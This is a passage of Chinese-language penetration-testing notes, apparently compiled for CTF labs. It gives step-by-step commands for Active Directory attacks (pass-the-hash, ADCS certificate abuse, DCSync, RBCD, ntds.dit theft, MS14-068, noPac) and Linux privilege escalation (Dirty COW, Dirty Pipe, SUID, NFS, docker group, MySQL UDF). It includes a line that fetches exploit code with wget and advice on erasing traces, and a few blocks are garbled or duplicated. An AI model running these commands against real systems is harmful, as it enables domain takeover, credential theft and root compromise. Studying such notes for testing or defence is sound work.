kiwi_cmd "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
```

### ADCS证书服务攻击

**文章** [ADCS攻击笔记 - 先知社区](F:\LocalCTF\ADCS攻击笔记 - 先知社区.html)

[CVE-2022-26923域提权漏洞复现 _ Mari0er's Blog](F:\LocalCTF\CVE-2022-26923域提权漏洞复现 _ Mari0er's Blog.html)

查看ADCS信息

```bash
certutil
```

![image-20231012210006494](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210006494.png)

扫证书漏洞

```bash
certipy find -u 'zhangxia@xiaorang.lab'  -password 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout
```

#### ESC1利用过程

申请 `XR Manager` 证书模版并伪造域管理员（证书模板为扫出的漏洞模板）

```bash
certipy req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca 'xiaorang-XIAORANG-DC-CA' -template 'XR Manager' -upn 'administrator@xiaorang.lab'
```

![image-20231012210603734](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210603734.png)

利用证书获取 TGT 和 NTLM Hash

```bash
certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7
```

![image-20231012210658114](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231012210658114.png)

#### CVE-2022–26923

该漏洞允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。在默认安装的ADCS里就启用了`Machine`模板。相当于伪造域控机器用户的证书。

添加机器账户，并将该机器账户dnsHostName指向DC[MAQ默认为10]:

```bash
certipy account create -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -user win -pass win@123456 -dns 'DC2012.red.lab'
```

![img](file:///F:/LocalCTF/ADCS%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20220814190426-dc4de08e-1bc0-1.png)

用该机器账户向ADCS请求证书：

```bash
certipy req -u 'win$'@red.lab -p win@123456 -target 192.168.149.135 -ca red-ADCS-CA -template Machine
```

![img](file:///F:/LocalCTF/ADCS%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20220814190449-ea03a9e8-1bc0-1.png)

用申请的证书请求DC$的TGT:

```bash
certipy auth -pfx dc2012.pfx -dc-ip 192.168.149.133
```

![img](file:///F:/LocalCTF/ADCS%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20220814190528-0130e22a-1bc1-1.png)

用DC$的nthash去DCSync:

```bash
secretsdump.py red.lab/'DC2012$'@192.168.149.133 -just-dc-user red/krbtgt -hashes :nthash
```

![img](file:///F:/LocalCTF/ADCS%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20220814191054-c3d3f042-1bc1-1.png)
如果使用`certipy`请求TGT失败，还可以设置RBCD来攻击：

```bash
openssl pkcs12 -in dc2012.pfx -out dc2012.pem -nodes
python3 bloodyAD.py -c ':dc2012.pem' -u 'win$' --host 192.168.149.133 setRbcd 'win$' 'DC2012$'
getST.py red.lab/'win$':'win@123456' -spn LDAP/DC2012.red.lab -impersonate administrator -dc-ip 192.168.149.133
export KRB5CCNAME=administrator.ccache
secretsdump.py -k dc2012.red.lab -just-dc-user red/krbtgt
```

![img](file:///F:/LocalCTF/ADCS%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20220814191543-70385760-1bc2-1.png)

![img](file:///F:/LocalCTF/ADCS%E6%94%BB%E5%87%BB%E7%AC%94%E8%AE%B0%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20220814191650-98385db4-1bc2-1.png)

### WriteDACL提权

#### 写DCSync

若Exchange机器账户默认对域内成员具有 WriteDACL 权限，这个权限允许身份修改指定对象ACL，所以可以给Zhangtong修改个DCSync，然后就可以抓域控哈希了。

给Zhangtong修改个DCSync

[bloodyAD.py](F:\ctfTools\bloodyAD-AD提权工具\bloodyAD.py)

```bash
python bloodyAD -d xiaorang.lab -u 'XIAORANG-EXC01$' -p :b0d89dce8c89f4a43758961e8f782174 --host 172.22.3.2 add dcsync Zhangtong
```

指定用户来dumphash

[secretsdump.py](F:\ctfTools\impacket\examples\secretsdump.py)

```bash
python secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm
```

#### 写RBCD

addcomputer

```bash
addcomputer.py xiaorang.lab/chenglei:'Xt61f3LBhg1' -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name 'TEST$' -computer-pass 'P@ssw0rd'
```

rbcd

```
rbcd.py xiaorang.lab/chenglei:'Xt61f3LBhg1' -dc-ip 172.22.13.6 -action write -delegate-to 'WIN-DC$' -delegate-from 'TEST$'
```

getst

```bash
getST.py xiaorang.lab/'TEST$':'P@ssw0rd' -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6
```

### 卷影拷贝获取ntds

有备份(SeBackupPrivilege) 以及还原文件或目录(SeRestorePrivilege)的权限，可以卷影拷贝然后读ntds

Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。

而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。

本地创一个raj.dsh，写入

```bash
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

接着用unix2dos raj.dsh转化格式

然后切换到C目录，然后创一个test文件夹切换过去(不然后面会没权限)，把本地的raj.dsh上传上去

```bash
mkdir test
cd test
upload raj.dsh
```

卷影拷贝

```bash
diskshadow /s raj.dsh
```

复制到到当前目录，也就是我们创建的这个test目录

```bash
RoboCopy /b z:\windows\ntds . ntds.dit
download ntds.dit
```

最后把system下下来，因为ntds的解密密钥在system内

接下来下载system

```bash
reg save HKLM\SYSTEM system
download system
```

本地进行解密

```bash
python secretsdump.py -ntds ntds.dit -system system local
```

拿下域控

```bash
proxychains evil-winrm -i 172.22.14.11 -u Administrator -H "70c39b547b7d8adec35ad7c09fb1d277"
```

### MS14-068

在小于2012R2且没有打`KB3011780`的域控中存在该漏洞，导致任意用户都可以把自己提权到域控级别。因为老版本的验证过程允许任何签名算法，因此我们只需要把PAC进行md5就可以生成新的校验和。这也就意味着我们可以随意更改PAC的内容，之后再用md5生成一个服务检验和以及KDC校验和。

[Kerberos域用户提权漏洞（MS14-068）分析与防范-腾讯云开发者社区-腾讯云](F:\LocalCTF\Kerberos域用户提权漏洞（MS14-068）分析与防范-腾讯云开发者社区-腾讯云.html)

工具 https://github.com/mubix/pykek

```bash
ms14-068.py -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.2.25 -p admin!@#45
```

```bash
kerberos::purge
```

```bash
kerberos::ptc "TGT_mary@god.org.ccache"
```

### NoPac （CVE-2021-42278 & CVE-2021-42287）

**文章** [LocalCTF\CVE-2021-42287&CVE-2021-42278 域内提权 - 先知社区](F:\LocalCTF\CVE-2021-42287&CVE-2021-42278 域内提权 - 先知社区.html)

[域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户](F:\LocalCTF\域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户.pdf)

**工具**  [noPac](F:\ctfTools\noPac-域内权限提升)

```bash
noPac.exe -domain attack.com -user jack -pass jack@777@.. /dc DC.attack.com /mAccount demo123 /mPassword Password123! /service ldap /ptt
或者
noPac.exe -domain attack.com -user jack -pass jack@777@.. /dc DC.attack.com /mAccount demo123 /mPassword Password123! /service cifs /ptt
```

也可以 使用 [noPac.py](F:\ctfTools\noPac-域内权限提升\noPac) 来打，不需要知道明文密码

如果账户在MA_Admin组，MA_Admin组对computer 能够创建对象

```bash
python noPac.py xiaorang.lab/zhanghui -hashes ':1232126b24cdf8c9bd2f788a9d7c7ed1' -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
```

 如果账户本身是机器用户的情况

```bash
python noPac.py xiaorang.lab/'XR-DESKTOP$' -hashes ':03e8d17f4da1797f6b69a9a7a23244c1' -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name 'XR-DESKTOP$' -old-hash ':03e8d17f4da1797f6b69a9a7a23244c1' -use-ldap -shell
```

## 跨域攻击

[内网渗透基石篇 _ 跨域攻击分析及防御 - FreeBuf网络安全行业门户](F:\LocalCTF\内网渗透基石篇 _ 跨域攻击分析及防御 - FreeBuf网络安全行业门户.pdf)

# Linux权限提升

### 内核漏洞提权

#### SearchSploit

用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码

**SearchSploit使用：**

**更新SearchSploit:**

```text
apt update && apt -y full-upgrade
searchsploit -u
```

**基本搜索语法：**

只需添加您想要查找的任意数量的搜索词：

```text
apt update && apt -y full-upgrade
searchsploit -u
```

![img](./images/20231018_0003177756.png)

**显示漏洞利用的完整路径:**

```text
-p, --path [EDB-ID]     显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号
```

![img](./images/20231018_0003189698.png)

不建议在本地的漏洞数据库中修改exp,建议使用-m参数复制那些有用的到当前的工作目录:

```text
-m, --mirror [EDB-ID]   把一个exp拷贝到当前工作目录,参数后加目标id
```

![img](./images/20231018_0003208518.png)

**2、exp利用：**

将exp上传到目标技巧，编译运行（编译方法，在源码的注释里有）

```text
gcc 9545.c -o exp
chmod 777 exp
./exp
```

当然，以上只是非常理想的情况，我们经常会遇到没有gcc的坑爹服务器。这时我们就需要在本地编译。本地编译时不止要看exp源码注释的编译参数，也需要手动调整一下编译的参数，比如给gcc 加-m 32来编译32位。编译问题繁多，有困难找谷歌。

最后强调利用内核漏洞的几个注意点：

1.读源码注释，有exp基本信息和编译方法，不然可能连编译都不会
2.读源码，不然费劲编译完才发现不适用
3.读源码，不然遇到一个删全盘的”exp“怎么办

#### 脏牛漏洞(CVE-2016-5195)

漏洞原理：该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。
漏洞编号：CVE-2016-5195
漏洞名称：脏牛（Dirty COW）
漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权
影响范围：3.9>Linux kernel >=2.6.22 并且Android也受影响

**漏洞复现：**

先查看一下系统版本信息

![img](./images/20231018_0003201252.png)

linux kernel版本2.6.32，应该可以用脏牛提权。下载脏牛提权脚本

这里使用dirty.c这个exp:

这个exp利用了dirtycow漏洞的pokemon漏洞 。会自动生成一个新的passwd行。运行二进制文件时，会提示用户输入新密码。原/etc/passwd文件会备份到/tmp/passwd.bak下 ，用生成的行覆盖根帐户。运行该漏洞后，你应该能够登录新创建的用户。使用此漏洞可以根据您的需要修改用户值。默认为“firefart”用户。

上传到目标系统tmp目录下

![img](./images/20231018_0003217790.png)

在/tmp目录下直接起一个命令行，然后编译运行脚本

![img](./images/20231018_0003229330.png)

此时切换到firefart用户，密码为123456

![img](./images/20231018_0003242041.png)

执行id命令后可以看到已经为root用户了，成功提权。

#### Dirty Pipe(CVE-2022-0847)

**利用条件**

```text
5.8<=Linux kernel<5.16.11/5.15.25/5.10.102
```

![img](./images/20231018_0003248307.png)

**EXP：**

```text
https://haxx.in/files/dirtypipez.c 
#原理为 直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来

or

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
#原理为 覆盖 /etc/passwd 中的 root 密码字段并在弹出 root shell 后恢复
```

**利用：**

```text
wget https://haxx.in/files/dirtypipez.c
gcc -o dirtypipez dirtypipez.c
./dirtypipez  /usr/bin/su  #任何具体suid权限的文件均可
```

![img](./images/20231018_0003267232.png)

### SUID 提权

```bash
# 查看可以suid 提权的可执行文件
find / -perm -u=s -type f 2>/dev/null
或者
find / -user root -perm -4000 -print 2>/dev/null
```

找到相应的可执行文件后，按照  [GTFOBINS](https://gtfobins.github.io/) 中的命令来进行提权

### 利用环境变量提权

本质就是某个程序调用某个可执行程序，我们便可以将我们的命令写一个跟该可执行程序同名的文件，再加入到`PATH`环境变量中，系统便会优先执行我们的文件，从而达到提权。

```bash
# 环境变量提权示例 script调用了ps
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH

cd /home/yokan/script
./shell
whoami
```

### nfs提权

利用先遣条件：`no_root_squash`选项得开启

1. 识别nfs共享，可以利用nmap工具或rpcinfo等工具

   ```bash
   nmap -sV -p111,2049 IP
   #nmap扫描nfs的常用端口111和2049
   rpcinfo -p 192.168.1.171
   #rpcinfo直接枚举nfs
   ```

2. - 检查nfs配置文件`/etc/exports`，检查开启的nsf共享目录和`no_root_squash`选项设置

   - 利用metasploit或showmount列举目标主机的可用nfs exports

     ```bash
     msf > use auxiliary/scanner/nfs/nfsmount
     msf auxiliary(nfsmount) > set rhosts IP
     msf auxiliary(nfsmount) > run
     ```

     ```bash
     showmount -e IP
     ```

3. 挂载nfs exports

   ```bash
   sudo mount -o [options] -t nfs ip_address:share directory_to_mount
   ```

   具体的一个例子

   ```bash
   root@ubuntu:/tmp# showmount -e 172.22.13.57
   Export list for 172.22.13.57:
   /home/joyce *
   root@ubuntu:/tmp# mount -t nfs 172.22.13.57:/home/joyce joyce/ -o nolock
   ```

4. 编写脚本，写入想执行的命令。可以是`/bin/bash`或C语言等脚本

   例子：

   - C语言脚本

     ```c
     #include<unistd.h>
     void main()
     {
             setuid(0);
             setgid(0);
             system("/bin/bash");
     }
     ```

   - python脚本

     ```python
     /usr/bin/python3
     
     import os
     import sys
     
     try: 
             os.system("/bin/bash")
     except:
             sys.exit()
     ```

5. chmod +s 文件添加suid权限

   具体的例子

   ```bash
   root@ubuntu:/tmp/joyce# chmod -s pwn.c
   root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn
   pwn.c: In function ‘main’:
   pwn.c:3:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
       3 |         setuid(0);
         |         ^~~~~~
   pwn.c:4:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
       4 |         setgid(0);
         |         ^~~~~~
   pwn.c:5:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
       5 |         system("/bin/bash");
         |         ^~~~~~
   root@ubuntu:/tmp/joyce# ls
   pwn  pwn.c
   root@ubuntu:/tmp/joyce# chmod +s pwn
   root@ubuntu:/tmp/joyce# ls -al
   total 52
   drwx------  3  996  994  4096 Aug 16 16:36 .
   drwxrwxrwt 13 root root  4096 Aug 16 16:36 ..
   -rw-------  1  996  994   755 Aug 16 16:35 .bash_history
   -rw-r--r--  1  996  994    18 Nov 25  2021 .bash_logout
   -rw-r--r--  1  996  994   193 Nov 25  2021 .bash_profile
   -rw-r--r--  1  996  994   231 Nov 25  2021 .bashrc
   -rwsr-sr-x  1 root root 16784 Aug 16 16:36 pwn
   -rw-r--r--  1 root root    83 Aug 16 16:35 pwn.c
   drwxr-xr-x  2 root root  4096 Aug 16 16:23 .ssh
   ```

6. 写ssh公钥

### 利用第三方服务提权

#### Docker 用户组提权

Docker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能跑。

Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，这就如同拥有 root 的访问权限。

如果一个服务器有一个普通的用户，并且这个用户加入了 docker 组，则这个用户已经是 root 了。

**方法一**

**环境搭建**

```bash
adduser test-d
usermod -G docker test-d
newgrp docker
```

Docker 组内用户执行命令的时候会自动在所有命令前添加 sudo

因为设计或者其他的原因，Docker 给予所有 docker 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）

**复现**

默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。

Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。

```bash
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```

![image-20230926172758108](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20230926172758108.png)

参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS

这个容器的启动脚本是 exploit.sh，主要内容是：chroot 到容器的 /hostOS （也就是宿主机的 /），然后获取到宿主机的 root 权限。

**方法二**

**环境搭建**

```bash
adduser test-d
usermod -G docker test-d
newgrp docker
```

**复现**

将 /etc/ 目录挂载进 Docker，查看 shadow 和 passwd

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
cat shadow
```

![image-20230926192819115](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20230926192819115.png)

这里已经获取到密码 hash，有两个办法进行权限提升，一是进行 hash 破解，二是添加一个特权账号，这里选择第二个方法。

```bash
openssl passwd -1 -salt test-docker
```

![image-20230926192845516](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20230926192845516.png)

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
echo 'test-docker:saltpasswd:0:0::/root:/bin/bash' >>passwd
```

![image-20230926192919044](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20230926192919044.png)

![image-20230926192954693](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20230926192954693.png)

#### MySQL UDF 提权

1. 背景介绍

UDF

[UDF](https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html)（user defined function）用户自定义函数,是MySQL的一个扩展接口，称为用户自定义函数,是用来拓展MySQL的技术手段，用户通过自定义函数来实现在MySQL中无法实现的功能。文件后缀为`.dll`或`.so`,常用c语言编写。拿到一个WebShell之后，在利用操作系统本身存在的漏洞提权的时候发现补丁全部被修补。这个时候需要利用第三方应用提权。当MYSQL权限比较高的时候我们就可以利用udf提权。

利用前提

- mysql允许导入导出文件
- 高权限用户启动，如root。该账号需要有对数据库`mysql`的insert和delete权限，其实是操作里面的`func`表，所以`func`表也必须存在。
- 未开启`‑‑skip‑grant‑tables`。开启的情况下，UDF不会被加载，默认不开启。

实验环境

手工启动mysql，指定root启动：mysqld_safe --user=root。默认是mysql用户启动。

\##2. 未GetShell的情况

> 适用情况：目标主机开启MySQL远程连接，并且已经获得MySQL数据库连接的用户名和密码信息

\###2.1 手工提权

#### [判断前提条件](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md#判断前提条件)

1. 查看是否允许导入导出文件

   ```
   mysql> show variables like "%secure_file_priv%";
   +------------------+-------+
   | Variable_name    | Value |
   +------------------+-------+
   | secure_file_priv |       |
   +------------------+-------+
   1 row in set (0.01 sec)
   ```

   

   这个参数（https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv）在MySQL数据库的安装目录的 my.ini 文件中配置，也可以作为启动参数。

   > secure_file_priv是用来限制load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。
   >
   > 当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权

2. 查看是否高权限

   ```
   mysql> select * from mysql.user where user = substring_index(user(), '@', 1) ;
   ```

   

3. 查看plugin的值

   ```
   mysql> select host,user,plugin from mysql.user where user = substring_index(user(),'@',1);
   +-----------+------+-----------------------+
   | host      | user | plugin                |
   +-----------+------+-----------------------+
   | localhost | root | mysql_native_password |
   +-----------+------+-----------------------+
   1 row in set (0.02 sec)
   ```

   

   plugin值表示mysql用户的认证方式。当 plugin 的值为空时不可提权，为 `mysql_native_password` 时可通过账户连接提权。默认为`mysql_native_password`。另外，mysql用户还需对此plugin目录具有写权限。

#### [上传udf库文件](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md#上传udf库文件)

1. 获取plugin路径

```
mysql> show variables like "%plugin%";
+-------------------------------+--------------------------------------------+
| Variable_name                 | Value                                      |
+-------------------------------+--------------------------------------------+
| default_authentication_plugin | mysql_native_password                      |
| plugin_dir                    | /usr/local/Cellar/mysql/5.7.22/lib/plugin/ |
+-------------------------------+--------------------------------------------+
2 rows in set (0.02 sec)
```



1. 获取服务器版本信息

```
mysql> show variables like 'version_compile_%';
+-------------------------+----------+
| Variable_name           | Value    |
+-------------------------+----------+
| version_compile_machine | x86_64   |
| version_compile_os      | osx10.13 |
+-------------------------+----------+
2 rows in set (0.01 sec)
```



1. 准备udf库文件

需要选择对应的版本，否则会报错。

- 从sqlmap获取

  sqlmap中有现成的udf文件。分别是32位和64位的。这里选择`sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`。

  不过这里的so是异或过的，需要执行以下命令解密：

  ```
  cd sqlmap/extra/cloak
  
  python3 cloak.py -d -i /security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
  ```

  

  此时会在相同目录生成解密后的lib_mysqludf_sys.so。

- 从metasploit中获取

  在kali的`/usr/share/metasploit-framework/data/exploits/mysql`目录下找到相应的库即可。

  *这个库和sqlmap解密后的一模一样。*

- 自行编译

 下载[lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

1. 上传udf库文件

   1. 获取库文件的16进制

      ```
      ```
      ```
      
      

   # [这里的mysql交互命令行是本地的，随意开一个就行](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md#这里的mysql交互命令行是本地的随意开一个就行)

   mysql> select hex(load_file('/security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt'; Query OK, 1 row affected (0.03 sec) ```

   1. 上传库文件

   ```
   # 这里的mysql交互命令行是目标数据库，7F454C46020打头的参数即/tmp/udf.txt的内容（注意去掉最后的换行）
   mysql> select unhex('7F454C46020...') into dumpfile '/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so';
   Query OK, 1 row affected (0.04 sec)
   ```

   

   上传库文件也可以通过临时表中转的方式，此处略。

#### [创建函数](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md#创建函数)

1. 先在**本地**查看有哪些函数可用

```
nm -D lib_mysqludf_sys.so
                 w _Jv_RegisterClasses
0000000000201788 A __bss_start
                 w __cxa_finalize
                 w __gmon_start__
0000000000201788 A _edata
0000000000201798 A _end
0000000000001178 T _fini
0000000000000ba0 T _init
                 U fgets
                 U fork
                 U free
                 U getenv
000000000000101a T lib_mysqludf_sys_info
0000000000000da4 T lib_mysqludf_sys_info_deinit
0000000000001047 T lib_mysqludf_sys_info_init
                 U malloc
                 U mmap
                 U pclose
                 U popen
                 U realloc
                 U setenv
                 U strcpy
                 U strncpy
0000000000000dac T sys_bineval
0000000000000dab T sys_bineval_deinit
0000000000000da8 T sys_bineval_init
0000000000000e46 T sys_eval
0000000000000da7 T sys_eval_deinit
0000000000000f2e T sys_eval_init
0000000000001066 T sys_exec
0000000000000da6 T sys_exec_deinit
0000000000000f57 T sys_exec_init
00000000000010f7 T sys_get
0000000000000da5 T sys_get_deinit
0000000000000fea T sys_get_init
000000000000107a T sys_set
00000000000010e8 T sys_set_deinit
0000000000000f80 T sys_set_init
                 U sysconf
                 U system
                 U waitpid
```



1. 创建`sys_eval`函数

```
mysql> create function sys_eval returns string soname "mysqludf.so";
Query OK, 0 rows affected (0.03 sec)
mysql>
```



1. 函数操作

```
# 调用函数
mysql> select sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| root               |
+--------------------+
1 row in set (0.03 sec)

# 查看函数
mysql> select * from mysql.func;
+----------+-----+-------------+----------+
| name   | ret | dl     | type   |
+----------+-----+-------------+----------+
| sys_eval |  0 | mysqludf.so | function |
+----------+-----+-------------+----------+
1 row in set

# 删除函数（清除痕迹）,如果要删除函数,必须udf文件还存在plugin目录下
drop function sys_eval;
或
delete from mysql.func where name='sys_eval';
```



### [2.2 利用sqlmap](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md#22-利用sqlmap)

\####全自动化

```
sqlmap.py -d "mysql://root:root@172.20.10.9:3306/mysql" --os-shell

...
[11:53:40] [INFO] connection to MySQL server '172.20.10.9:3306' established
[11:53:40] [INFO] testing MySQL
[11:53:40] [INFO] confirming MySQL
[11:53:40] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:53:40] [INFO] fingerprinting the back-end DBMS operating system
[11:53:40] [INFO] the back-end DBMS operating system is Linux
[11:53:40] [INFO] testing if current user is DBA
[11:53:40] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[11:53:45] [INFO] checking if UDF 'sys_exec' already exist
[11:53:45] [INFO] checking if UDF 'sys_eval' already exist
[11:53:50] [INFO] detecting back-end DBMS version from its banner
[11:53:50] [INFO] the local file '/var/folders/bx/zb9__nb1591g_r8k78p5p0gr0000gn/T/sqlmap_5_qd1_y51533/lib_mysqludf_sysp478pm69.so' and the remote file './libsoxbd.so' have the same size (8040 B)
[11:53:50] [INFO] creating UDF 'sys_exec' from the binary UDF file
[11:53:50] [INFO] creating UDF 'sys_eval' from the binary UDF file
[11:53:50] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[11:53:50] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a]

No output
os-shell>
```



没有得到执行结果，查看func表也没有udf记录，未找到原因。

\####半自动化

1. 获取plugin目录

   ```
   python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --sql-shell
           ___
          __H__
    ___ ___[']_____ ___ ___  {1.4.2.24#dev}
   |_ -| . [']     | .'| . |
   |___|_  [)]_|_|_|__,|  _|
         |_|V...       |_|   http://sqlmap.org
   
   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
   
   [*] starting @ 13:21:33 /2020-02-10/
   
   [13:21:34] [INFO] connection to MySQL server '172.20.10.9:3306' established
   [13:21:34] [INFO] testing MySQL
   [13:21:34] [INFO] resumed: [['1']]...
   [13:21:34] [INFO] confirming MySQL
   [13:21:34] [INFO] resumed: [['1']]...
   [13:21:34] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
   [13:21:34] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
   sql-shell> select @@plugin_dir;
   [13:22:06] [INFO] fetching SQL SELECT statement query output: 'select @@plugin_dir'
   select @@plugin_dir [1]:
   [*] /usr/lib/x86_64-linux-gnu/mariadb18/plugin/
   
   sql-shell>
   ```

   

   得到plugin目录为`/usr/lib/x86_64-linux-gnu/mariadb18/plugin/`。

2. 上传lib_mysqludf_sys到plugin目录

   ```
   python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --file-write=/Users/simon/Downloads/lib_mysqludf_sys_64.so --file-dest=/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so
           ___
          __H__
    ___ ___[.]_____ ___ ___  {1.4.2.24#dev}
   |_ -| . ["]     | .'| . |
   |___|_  [(]_|_|_|__,|  _|
         |_|V...       |_|   http://sqlmap.org
   
   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
   
   [*] starting @ 13:28:35 /2020-02-10/
   
   [13:28:36] [INFO] connection to MySQL server '172.20.10.9:3306' established
   [13:28:36] [INFO] testing MySQL
   [13:28:36] [INFO] resumed: [['1']]...
   [13:28:36] [INFO] confirming MySQL
   [13:28:36] [INFO] resumed: [['1']]...
   [13:28:36] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
   [13:28:36] [INFO] fingerprinting the back-end DBMS operating system
   [13:28:36] [INFO] resumed: [['0']]...
   [13:28:36] [INFO] the back-end DBMS operating system is Linux
   do you want confirmation that the local file '/Users/simon/Downloads/lib_mysqludf_sys_64.so' has been successfully written on the back-end DBMS file system ('/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so')? [Y/n]
   
   [13:28:42] [INFO] the local file '/Users/simon/Downloads/lib_mysqludf_sys_64.so' and the remote file '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so' have the same size (8040 B)
   [13:28:42] [INFO] connection to MySQL server '172.20.10.9:3306' closed
   
   [*] ending @ 13:28:42 /2020-02-10/
   ```

   

3. 创建&执行函数

   ```
   python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --sql-shell
           ___
          __H__
